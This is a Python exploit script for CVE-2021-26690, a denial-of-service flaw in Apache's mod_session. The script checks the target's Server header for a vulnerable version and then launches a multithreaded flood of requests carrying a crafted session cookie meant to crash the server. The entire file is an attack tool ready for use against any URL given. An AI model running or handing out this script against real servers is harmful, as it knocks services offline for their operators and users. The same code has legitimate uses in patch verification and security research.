#!/usr/bin/env python3
"""
Exploit code for CVE-2021-26690 - Apache mod_session NULL Pointer Dereference DoS
Tested on Apache HTTP Server version 2.4.46.

Usage:
    python3 exploit.py <target_url> [-t THREAD_COUNT]

Note: Press Ctrl+C to stop the attack.
"""
import argparse, requests, threading, time, sys, re

def is_vulnerable_apache_version(version_str):
    """
    Check if the given Apache version string is vulnerable.
    Vulnerable versions: 2.4.0 to 2.4.46 (inclusive)
    
    Parameters:
        version_str (str): The version string (e.g., "2.4.46" or "Apache/2.4.46 (Unix)")
    
    Returns:
        bool: True if the version is vulnerable, False otherwise.
    """
    # Use regex to find a version pattern like "2.4.46"
    match = re.search(r'(\d+)\.(\d+)\.(\d+)', version_str)
    if not match:
        return False  # Unable to extract version numbers, assume not vulnerable
    
    major, minor, patch = map(int, match.groups())
    
    # Check if the version falls within 2.4.0 <= version <= 2.4.46
    if major == 2 and minor == 4 and 0 <= patch <= 46:
        return True
    else:
        return False

def check_apache_version(url, session):
    """
    Checks if the target URL is served by Apache and extracts its version if available.
    
    Parameters:
        url (str): The target URL.
        session (requests.Session): A persistent requests session.
    
    Returns:
        str: The Apache version if found, else None.
    """
    try:
        # Send a HEAD request to get response headers without downloading the entire content.
        response = session.head(url, timeout=5)
        server_header = response.headers.get("Server", "")
        print(f"[DEBUG] Server header: {server_header}")
        
        # Check if the 'Server' header indicates Apache
        if "Apache" in server_header:
            print("[INFO] Server is Apache.")
            
            # Use a regex to capture the version number from a typical Apache Server header.
            # Example header: "Apache/2.4.46 (Unix) OpenSSL/1.1.1c"
            version_match = re.search(r'Apache/([\d\.]+)', server_header)
            if version_match:
                version = version_match.group(1)
                print(f"[INFO] Apache version detected: {version}")
                return version
            else:
                print("[WARN] Apache server detected, but version could not be determined.")
                return None
        else:
            print("[INFO] Server is not Apache.")
            return None
    except requests.exceptions.RequestException as e:
        print(f"[ERROR] Error checking server: {e}")
        return None

def check_server(target_url, session):
    """
    Checks if a web server is running on the target URL by sending a HEAD request.
    Returns True if a valid server is found; otherwise, prints an error and returns False.
    """
    try:
        response = session.head(target_url, timeout=5)
        if response.status_code < 400:
            print(f"[INFO] Web server found at {target_url} (status code: {response.status_code})")
            return True
        else:
            print(f"[ERROR] Received status code {response.status_code} from {target_url}. Exiting.")
            return False
    except requests.exceptions.RequestException as e:
        print(f"[ERROR] Could not reach {target_url}: {e}")
        return False

def send_crafted_request(target_url, session):
    """
    Sends crafted requests in a loop to the target URL.
    The crafted cookie is designed to trigger the DoS vulnerability.
    """
    crafted_cookie = "session=expiry=AAAAAAAAAAA&="
    headers = {
        "Cookie": crafted_cookie
    }
    while True:
        try:
            response = session.get(target_url, headers=headers, timeout=5)
            if response.status_code == 200:
                print(f"[INFO] Server responded with {response.status_code}: service appears available.")
            else:
                print(f"[WARN] Unexpected response code: {response.status_code}")
        except requests.exceptions.ConnectionError:
            print("[ERROR] Connection error: likely DoS triggered (empty reply from server).")
        except requests.exceptions.Timeout:
            print("[ERROR] Request timed out: potential DoS condition.")
        except Exception as e:
            print(f"[ERROR] Exception occurred: {e}")
        time.sleep(0.1)

def exploit(target_url, thread_count):
    """
    Launches multiple threads to continuously send crafted requests to the target.
    """
    session = requests.Session()
    
    # Check if the target URL is running a web server
    if not check_server(target_url, session):
        print("[ERROR] No web server detected at the target URL. Exiting.")
        sys.exit(1)
    
    threads = []
    print(f"[INFO] Launching DoS attack on {target_url} with {thread_count} threads.")
    
    for _ in range(thread_count):
        thread = threading.Thread(target=send_crafted_request, args=(target_url, session))
        thread.daemon = True  # Threads exit when the main thread exits
        thread.start()
        threads.append(thread)
    
    # Keep the main thread alive until the user interrupts with Ctrl+C
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print("\n[INFO] Exploit interrupted by user. Exiting...")
        sys.exit(0)

if __name__ == "__main__":
    parser = argparse.ArgumentParser(
        description="Exploit for CVE-2021-26690 - Apache mod_session DoS vulnerability"
    )
    parser.add_argument("target_url", help="Target URL to test (e.g., http://example.com)")
    parser.add_argument("-t", "--threads", type=int, default=10,
                        help="Number of concurrent threads (default: 10)")
    args = parser.parse_args()

    session = requests.Session()
    version = check_apache_version(args.target_url, session)

    # Check if the Apache version is vulnerable
    if not is_vulnerable_apache_version(version):
        print("[ERROR] Apache version is not vulnerable to CVE-2021-26690. Exiting.")
        sys.exit(1)
    
    print(f"[INFO] Target URL: {args.target_url} is vulnerable! Launching exploit...")
    exploit(args.target_url, args.threads)